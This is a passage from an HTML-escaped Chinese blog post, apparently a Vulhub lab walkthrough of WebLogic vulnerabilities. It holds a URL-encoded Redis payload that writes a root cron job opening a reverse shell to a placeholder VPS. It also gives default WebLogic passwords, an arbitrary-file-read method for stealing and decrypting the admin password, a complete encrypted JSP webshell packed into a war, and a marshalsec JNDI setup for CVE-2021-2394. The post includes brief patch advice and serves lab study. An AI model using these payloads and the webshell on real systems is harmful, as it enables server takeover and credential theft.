+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2FYOUR-VPS-IP%2F6666%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171451017.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=xY5Ng&amp;amp;originHeight=381&amp;amp;originWidth=1695&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171505385.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=XUFhK&amp;amp;originHeight=1079&amp;amp;originWidth=1920&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ol start=&#34;4&#34;&gt;
+&lt;li&gt;成功反弹&lt;br&gt;
+&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171512837.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=UxQ19&amp;amp;originHeight=263&amp;amp;originWidth=437&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
+&lt;li&gt;可进行利用的 cron 有如下几个地方:&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;/etc/crontab&lt;/code&gt;  这个是肯定的&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/etc/cron.d/*&lt;/code&gt;  将任意文件写到该目录下，效果和 crontab 相同，格式也要和 &lt;code&gt;/etc/crontab&lt;/code&gt;  相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹 shell。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/var/spool/cron/root&lt;/code&gt;  centos 系统下 root 用户的 cron 文件&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/var/spool/cron/crontabs/root&lt;/code&gt;  debian 系统下 root 用户的 cron 文件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;修复方案&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#修复方案&#34;&gt;#&lt;/a&gt; 修复方案&lt;/h3&gt;
+&lt;p&gt;目前厂商已经发布了升级补丁以修复此安全问题，补丁获取链接:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5vcmFjbGUuY29tL3RlY2huZXR3b3JrL3RvcGljcy9zZWN1cml0eS9jcHVqdWwyMDE0LTE5NzI5NTYuaHRtbA==&#34;&gt;Oracle WebLogic Server 安全漏洞补丁&lt;/span&gt;&lt;/p&gt;
+&lt;h2 id=&#34;weak_password&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#weak_password&#34;&gt;#&lt;/a&gt; weak_password&lt;/h2&gt;
+&lt;h3 id=&#34;漏洞概述-7&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞概述-7&#34;&gt;#&lt;/a&gt; 漏洞概述&lt;/h3&gt;
+&lt;p&gt;在 weblogic 搭建好之后没有修改进入后台的密码导致弱口令登录获得 webshell&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;本环境模拟了一个真实的 weblogic 环境，其后台存在一个弱口令，并且前台存在任意文件读取漏洞。分别通过这两种漏洞，模拟对 weblogic 场景的渗透。&lt;/li&gt;
+&lt;li&gt;Weblogic 版本：10.3.6 (11g)&lt;br&gt;
+ Java 版本：1.6&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;漏洞复现-7&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞复现-7&#34;&gt;#&lt;/a&gt; 漏洞复现&lt;/h3&gt;
+&lt;h4 id=&#34;暴力破解&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#暴力破解&#34;&gt;#&lt;/a&gt; 暴力破解&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;访问： &lt;code&gt;http://your-ip:7001/console&lt;/code&gt;  进入后台	&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210172018933.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=DshTU&amp;amp;originHeight=1079&amp;amp;originWidth=1920&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
+&lt;li&gt;Weblogic 常见弱口令总结&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;system:password&lt;/li&gt;
+&lt;li&gt;weblogic:weblogic&lt;/li&gt;
+&lt;li&gt;admin:secruity&lt;/li&gt;
+&lt;li&gt;joe:password&lt;/li&gt;
+&lt;li&gt;mary:password&lt;/li&gt;
+&lt;li&gt;system:sercurity&lt;/li&gt;
+&lt;li&gt;wlcsystem:wlcsystem&lt;/li&gt;
+&lt;li&gt;weblogic:Oracle&lt;a href=&#34;/123&#34;&gt;@123 &lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;访问后台登录地址，输入任意账号密码，Burpsuite 抓包&lt;br&gt;
+&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210172021603.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=Ohuj9&amp;amp;originHeight=638&amp;amp;originWidth=1794&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
+&lt;li&gt;设置 Payload&lt;br&gt;
+&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210172021244.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=x1MDc&amp;amp;originHeight=412&amp;amp;originWidth=585&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210172022060.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=qrXT0&amp;amp;originHeight=454&amp;amp;originWidth=659&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;任意文件读取&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#任意文件读取&#34;&gt;#&lt;/a&gt; 任意文件读取&lt;/h4&gt;
+&lt;p&gt;本环境前台模拟了一个任意文件下载漏洞，访问 &lt;code&gt;http://your-ip:7001/hello/file.jsp?path=/etc/passwd&lt;/code&gt;  可见成功读取 passwd 文件。那么，该漏洞如何利用？&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;weblogic 密码使用 AES（老版本 3DES）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可；&lt;br&gt;
+这两个文件均位于 base_domain 下，名为 SerializedSystemIni.dat 和 config.xml；&lt;/li&gt;
+&lt;li&gt;SerializedSystemIni.dat 是一个二进制文件，所以一定要用 burpsuite 来读取，用浏览器直接下载可能引入一些干扰字符。在 burp 里选中读取到的那一串乱码，这就是密钥，&lt;strong&gt;选中乱码右键 copy to file&lt;/strong&gt; 就可以保存成一个文件，文件名: &lt;code&gt;SerializedSystemIni.dat&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;下载密文&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#下载密文&#34;&gt;#&lt;/a&gt; 下载密文&lt;/h5&gt;
+&lt;p&gt;brup 抓包访问:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMi4xODg6NzAwMS9oZWxsby9maWxlLmpzcD9wYXRoPXNlY3VyaXR5L1NlcmlhbGl6ZWRTeXN0ZW1JbmkuZGF0&#34;&gt;http://192.168.2.188:7001/hello/file.jsp?path=security/SerializedSystemIni.dat&lt;/span&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210172056381.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=mhO9X&amp;amp;originHeight=1079&amp;amp;originWidth=1920&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h5 id=&#34;下载密钥&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#下载密钥&#34;&gt;#&lt;/a&gt; 下载密钥&lt;/h5&gt;
+&lt;p&gt;获取 config.xml 的包，找到加密后的管理员密码 http://192.168.2.188:7001/hello/file.jsp?path=config/config.xml&lt;br&gt;
+ &lt;code&gt;config.xml&lt;/code&gt;  是 base_domain 的全局配置文件，所以乱七八糟的内容比较多，找到其中的 &lt;code&gt;&amp;lt;node-manager-password-encrypted&amp;gt;&lt;/code&gt;  的值，即为加密后的管理员密码，不要找错了&lt;br&gt;
+&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210172057894.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=IfRW9&amp;amp;originHeight=1079&amp;amp;originWidth=1920&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h5 id=&#34;解密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#解密&#34;&gt;#&lt;/a&gt; 解密&lt;/h5&gt;
+&lt;p&gt;然后进行解密，工具地址:&lt;br&gt;
+&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210180921017.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=TrwBL&amp;amp;originHeight=219&amp;amp;originWidth=582&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;strong&gt; 可能遇到的问题，如果怎么解密都不对，那可能是返回包的编码不对，进行如下设置&lt;/strong&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210180920756.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=ensx4&amp;amp;originHeight=1079&amp;amp;originWidth=1920&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+如果出现以下情况可能是没有选中乱码进行 copy to file&lt;br&gt;
+&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210180920969.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=oVECH&amp;amp;originHeight=435&amp;amp;originWidth=909&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h5 id=&#34;后台上传webshell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#后台上传webshell&#34;&gt;#&lt;/a&gt; 后台上传 webshell&lt;/h5&gt;
+&lt;p&gt;获取到管理员密码后，登录后台。点击左侧的 Deployments, 可见一个应用列表：&lt;br&gt;
+&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210182205825.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=h9yxp&amp;amp;originHeight=813&amp;amp;originWidth=1604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+点击 Install，选择 &amp;quot;upload your file (s)&amp;quot;&lt;br&gt;
+&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210180931839.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=BhkEw&amp;amp;originHeight=813&amp;amp;originWidth=1604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+ 上传 war 包。值得注意的是，我们平时 tomcat 用的 war 包不一定能够成功，你可以将你的 webshell 放到本项目的 &lt;code&gt;web/jiangjiyue.war&lt;/code&gt;  这个压缩包中，再上传。上传成功后点下一步。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;上传的 war 文件是将一句话写在 jiangjiyue.jsp 中，再将 jiangjiyue.jsp 压缩成 jiangjiyue.zip ，再将 jiangjiyue.zip 改名为 jiangjiyue.war。&lt;/p&gt;
+&lt;p&gt;一句话木马如下，密码为 pass&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&amp;lt;%@page import=&amp;quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&amp;quot;%&amp;gt;&amp;lt;%!class U extends ClassLoader&amp;#123;U(ClassLoader c)&amp;#123;super(c);&amp;#125;public Class g(byte []b)&amp;#123;return super.defineClass(b,0,b.length);&amp;#125;&amp;#125;%&amp;gt;&amp;lt;%if(request.getParameter(&amp;quot;pass&amp;quot;)!=null)&amp;#123;String k=(&amp;quot;&amp;quot;+UUID.randomUUID()).replace(&amp;quot;-&amp;quot;,&amp;quot;&amp;quot;).substring(16);session.putValue(&amp;quot;u&amp;quot;,k);out.print(k);return;&amp;#125;Cipher c=Cipher.getInstance(&amp;quot;AES&amp;quot;);c.init(2,new SecretKeySpec((session.getValue(&amp;quot;u&amp;quot;)+&amp;quot;&amp;quot;).getBytes(),&amp;quot;AES&amp;quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210180947005.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=YHAa7&amp;amp;originHeight=376&amp;amp;originWidth=1518&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210180948945.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=PQQdY&amp;amp;originHeight=469&amp;amp;originWidth=1430&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210180955777.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=vNuiu&amp;amp;originHeight=1079&amp;amp;originWidth=1920&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210180951543.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=jWbHr&amp;amp;originHeight=197&amp;amp;originWidth=1543&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h5 id=&#34;冰蝎连接&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#冰蝎连接&#34;&gt;#&lt;/a&gt; 冰蝎连接&lt;/h5&gt;
+&lt;p&gt;软件:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zZWN1cml0eS0xMjU4ODk0NzI4LmNvcy5hcC1iZWlqaW5nLm15cWNsb3VkLmNvbS93cml0ZXVwL3Z1bGh1Yi93ZWJsb2dpYy9CZWhpbmRlcl92My4wX0JldGFfOV9maXhlZC56aXA=&#34;&gt;https://security-1258894728.cos.ap-beijing.myqcloud.com/writeup/vulhub/weblogic/Behinder_v3.0_Beta_9_fixed.zip&lt;/span&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://static.dingtalk.com/media/lQLPJxbJ56UEtQ3NAmvNAn-wv2yEXzsX2nMDS94C-oCFAA_639_619.png?auth_bizType=&#39;IM&#39;#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=r7GKe&amp;amp;originHeight=619&amp;amp;originWidth=639&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210181051896.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=Tc2j0&amp;amp;originHeight=146&amp;amp;originWidth=557&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;修复建议-6&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#修复建议-6&#34;&gt;#&lt;/a&gt; 修复建议&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;设置 Config.do 页面登录授权后访问&lt;/li&gt;
+&lt;li&gt;IPS 等防御产品可以加入相应的特征&lt;/li&gt;
+&lt;li&gt;升级到官方最新版本&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;weblogic反序列化漏洞cve_2021_2394&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#weblogic反序列化漏洞cve_2021_2394&#34;&gt;#&lt;/a&gt; Weblogic 反序列化漏洞 (cve_2021_2394)&lt;/h2&gt;
+&lt;p&gt;环境安装:&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;wget&lt;/span&gt; https://security-1258894728.cos.ap-beijing.myqcloud.com/writeup/vulhub/weblogic/fmw_12.2.1.3.0_wls_Disk1_1of1.zip&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;unzip&lt;/span&gt; fmw_12.2.1.3.0_wls_Disk1_1of1.zip&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;java&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-jar&lt;/span&gt; fmw_12.2.1.3.0_wls.jar&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;使用管理员运行:C:&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;Oracle&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;Middleware&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;Oracle_Home&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;user_projects&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;domains&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;wl_server&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;startWebLogic.cmd&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ul&gt;
+&lt;li&gt;请使用低版本的 jdk 安装 weblogic 进行测试&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;基于 RMI 的利用方式，JDK 版本限制于 6u132、7u131、8u121 之前，在 8u122 及之后的版本中，加入了反序列化白名单的机制，关闭了 RMI 远程加载代码 基于 LDAP 的利用方式，JDK 版本限制于 6u211、7u201、8u191、11.0.1 之前，在 8u191 版本中，Oracle 对 LDAP 向量设置限制，发布了 CVE-2018-3149，关闭 JNDI 远程类加载 From：&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;虚拟机中无法复现&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;后面看到了 Iz2y 的 EXP 中有这篇说明：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNzQ5OA==&#34;&gt;手把手教你解决 Weblogic CVE-2020-2551 POC 网络问题&lt;/span&gt;，应该就是这个问题了，这里我的理解是 docker 里面返回的地址是一个内网地址（172 开头），我们攻击的机器只能访问外网的地址，因此导致发送不了攻击数据；但是本地就不一样了，本地是能够直接访问 docker 的网络的，所以本地就不会有问题，而在真实环境中也应该没有这种问题。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;漏洞概述-8&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞概述-8&#34;&gt;#&lt;/a&gt; 漏洞概述&lt;/h3&gt;
+&lt;p&gt;Oracle 官方发布了 2021 年 7 月份安全更新通告，通告中披露了 WebLogic 组件存在高危漏洞，攻击者可以在未授权的情况下通过 IIOP、T3 协议对存在漏洞的 WebLogic Server 组件进行攻击。成功利用该漏洞的攻击者可以接管 WebLogic Server。&lt;/p&gt;
+&lt;p&gt;这是一个二次反序列化漏洞，是 CVE-2020-14756 和 CVE-2020-14825 的调用链相结合组成一条新的调用链来绕过 weblogic 黑名单列表。&lt;br&gt;
+&lt;strong&gt;漏洞条件:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;启用了 IIOP、T3 协议&lt;/li&gt;
+&lt;li&gt;JDK 版本符合 JNDI 注入条件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;影响版本:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;WebLogic Server 10.3.6.0.0&lt;/li&gt;
+&lt;li&gt;WebLogic Server 12.1.3.0.0&lt;/li&gt;
+&lt;li&gt;WebLogic Server 12.2.1.3.0&lt;/li&gt;
+&lt;li&gt;WebLogic Server 12.2.1.4.0&lt;/li&gt;
+&lt;li&gt;WebLogic Server 14.1.1.0.0&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;漏洞复现-8&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞复现-8&#34;&gt;#&lt;/a&gt; 漏洞复现&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;下载 marshalsec 利用 marshalsec 开启 JNDI 服务&lt;br&gt;
+ &lt;code&gt;https://security-1258894728.cos.ap-beijing.myqcloud.com/writeup/vulhub/weblogic/marshalsec-0.0.3-SNAPSHOT-all.jar&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;创建 Evil.java，通过 javac 编译得到 Evil.class&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Evil&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Evil&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Exception&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token class-name&#34;&gt;Runtime&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getRuntime&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;calc.exe&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210182208161.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=cw2nM&amp;amp;originHeight=483&amp;amp;originWidth=1265&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+ &lt;code&gt;javac Exploit.java&lt;/code&gt;  必须是 java1.8&lt;/p&gt;
+&lt;ol start=&#34;3&#34;&gt;
